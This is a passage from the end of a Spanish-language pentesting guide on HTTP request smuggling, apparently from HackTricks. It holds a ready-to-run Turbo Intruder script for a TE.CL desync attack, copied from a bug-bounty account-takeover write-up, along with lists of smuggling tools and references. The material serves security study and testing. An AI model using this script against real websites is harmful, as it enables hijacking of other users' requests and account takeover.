def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Herramientas

- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gramática útil para encontrar discrepancias extrañas en el request smuggling.

## Referencias

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)


{{#include ../../banners/hacktricks-training.md}}
